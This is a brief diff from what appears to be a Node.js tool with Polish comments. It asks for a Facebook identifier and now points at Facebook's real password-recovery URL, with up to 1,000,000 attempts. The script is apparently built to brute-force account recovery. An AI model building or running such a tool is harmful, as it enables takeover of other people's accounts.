@@ -55,7 +55,7 @@ const identifierType = readline.keyInSelect(identifierTypes, 'Select the identif
 const identifier = readline.question('Enter the Facebook identifier (ID, email, or phone): ');
 
 // Przykładowy link do strony odzyskiwania hasła
-const recoveryLink = 'https://facebook.com/recovery';
+const recoveryLink = 'https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0';
 
 // Maksymalna liczba prób
 const maxAttempts = 1000000;  // Możesz dostosować tę wartość
